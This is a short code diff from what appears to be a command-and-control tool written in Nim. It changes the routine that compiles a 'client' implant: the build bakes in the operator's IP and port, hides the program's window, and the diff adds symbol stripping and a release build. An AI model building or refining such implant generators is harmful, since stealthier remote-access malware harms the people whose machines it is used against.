@@ -1,4 +1,3 @@
-
 import osproc, strutils, asyncdispatch
 
 import ../../types
@@ -41,9 +40,11 @@ proc execProc*(args: seq[string], server: C2Server) {.async.} =
     platform = args[4]
     ip = args[2]
     port = args[3]
-  
+
   let compileCommand = "nim c -d:client " &
     "--app=gui " & # disable window 
+    "--passL:-s" & " " &  
+    "-d:release" & " " &  
     "-d:ip=" & ip & " " & 
     "-d:port=" & port & " " & 
     (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
